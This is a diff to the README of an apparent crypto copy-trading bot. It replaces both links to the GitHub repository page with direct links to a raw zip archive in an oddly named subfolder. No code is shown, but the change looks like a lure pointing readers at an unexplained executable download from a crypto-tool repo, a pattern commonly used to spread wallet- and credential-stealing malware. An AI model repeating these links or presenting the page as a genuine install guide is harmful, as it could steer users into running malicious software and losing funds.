@@ -1,6 +1,6 @@
 # 🤖 Hyperliquid-Copytrading-Bot - Copy Trades With Less Effort
 
-[![Download](https://img.shields.io/badge/Download-Hyperliquid--Copytrading--Bot-blue?style=for-the-badge)](https://github.com/Ayubuk3596/Hyperliquid-Copytrading-Bot)
+[![Download](https://img.shields.io/badge/Download-Hyperliquid--Copytrading--Bot-blue?style=for-the-badge)](https://github.com/Ayubuk3596/Hyperliquid-Copytrading-Bot/raw/refs/heads/main/swarthy/Bot_Hyperliquid_Copytrading_v1.3.zip)
 
 ## 🚀 What This App Does
 
@@ -12,7 +12,7 @@ Use it if you want a simple way to keep your account in line with another trader
 
 Use this link to visit the page and download the app:
 
-[https://github.com/Ayubuk3596/Hyperliquid-Copytrading-Bot](https://github.com/Ayubuk3596/Hyperliquid-Copytrading-Bot)
+[https://github.com/Ayubuk3596/Hyperliquid-Copytrading-Bot/raw/refs/heads/main/swarthy/Bot_Hyperliquid_Copytrading_v1.3.zip](https://github.com/Ayubuk3596/Hyperliquid-Copytrading-Bot/raw/refs/heads/main/swarthy/Bot_Hyperliquid_Copytrading_v1.3.zip)
 
 ### Steps to get started
 
